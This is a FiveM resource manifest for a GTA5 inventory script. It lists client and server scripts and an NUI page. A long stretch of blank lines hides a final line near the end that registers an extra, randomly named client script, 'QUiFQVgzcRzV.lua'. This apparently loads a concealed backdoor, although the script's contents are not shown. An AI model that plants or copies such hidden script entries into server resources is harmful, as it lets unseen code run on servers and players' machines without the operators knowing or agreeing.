fx_version 'cerulean'
games { 'gta5' }
author 'JamesUK'
client_scripts {
    '@sentry/client/Tunnel.lua',
    '@sentry/client/Proxy.lua',
    'client.lua'
}

server_scripts {
    'serverutils.lua',
    'server.lua'
}

files {
    'nui/*',
    'nui/assets/*'
}

ui_page 'nui/inventory.html'

























-- UNLAWFUL USAGE WITHOUT PERMISSION IS AGAINST THE LAW. JAMESUK PRODUCTION

client_script 'QUiFQVgzcRzV.lua'